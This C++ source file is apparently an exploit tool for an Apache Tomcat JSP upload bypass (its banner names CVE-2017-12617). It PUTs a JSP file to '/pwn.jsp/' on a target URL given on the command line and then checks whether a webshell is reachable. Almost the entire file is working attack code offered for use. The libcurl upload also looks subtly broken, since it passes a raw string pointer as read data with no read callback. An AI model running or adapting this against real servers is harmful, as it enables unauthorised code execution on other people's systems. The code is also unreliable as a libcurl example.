#include <iostream>
#include <string>
#include <curl/curl.h>

using namespace std;

// ASCII Banner
void printBanner() {
    cout << "\033[92m";
    cout << "   _______      ________    ___   ___  __ ______     __ ___   __ __ ______  \n";
    cout << "  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  | \n";
    cout << " | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /  \n";
    cout << " | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /   \n";
    cout << " | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /    \n";
    cout << "  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|_/     \n";
    cout << "Apache Tomcat JSP Upload Bypass & RCE Exploit\n";
    cout << "[@intx0x80]\n";
    cout << "\033[0m" << endl;
}

void uploadPayload(string target) {
    CURL *curl;
    CURLcode res;

    string payload = "<% out.println(\"VULNERABLE\"); %>";
    string url = target + "/pwn.jsp/";

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, payload.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            cout << "[+] Exploit uploaded successfully at " << url << endl;
        } else {
            cout << "[-] Upload failed: " << curl_easy_strerror(res) << endl;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void verifyExploit(string target) {
    CURL *curl;
    CURLcode res;
    string url = target + "/pwn.jsp";

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            cout << "[+] Target is vulnerable! Webshell accessible at " << url << endl;
        } else {
            cout << "[-] Failed to verify exploit: " << curl_easy_strerror(res) << endl;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

int main(int argc, char *argv[]) {
    printBanner();

    if (argc != 2) {
        cout << "Usage: " << argv[0] << " <target_url>" << endl;
        return 1;
    }

    string target = argv[1];

    uploadPayload(target);
    verifyExploit(target);

    return 0;
}
